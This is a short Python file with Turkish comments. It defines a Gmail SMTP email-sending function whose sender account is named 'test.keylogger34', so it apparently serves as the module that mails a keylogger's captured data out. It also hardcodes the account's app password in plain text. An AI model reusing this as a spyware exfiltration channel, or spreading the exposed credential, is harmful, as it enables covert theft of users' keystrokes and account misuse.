import smtplib
import socket

def send_email(subject, body, to_email):
    # E-posta gönderici ve alıcı bilgileri
    from_email = 'test.keylogger34@gmail.com'
    password = 'aqvjlaiscdpvosso'
    
    # E-posta başlık ve içeriği oluşturma
    email_text = f"Subject: {subject}\n\n{body}"
    
    # SMTP sunucusuna bağlanma
    try:
        smtp_server = smtplib.SMTP('smtp.gmail.com', 587)  # Örnek SMTP sunucusu ve portu
        smtp_server.ehlo()
        smtp_server.starttls()
        smtp_server.ehlo()
        smtp_server.login(from_email, password)
        
        # E-posta gönderme
        smtp_server.sendmail(from_email, to_email, email_text)
        print("E-posta gönderildi!")
        
    except (smtplib.SMTPException, socket.error) as e:
        print("E-posta gönderilirken bir hata oluştu:", e)
        
    finally:
        smtp_server.quit()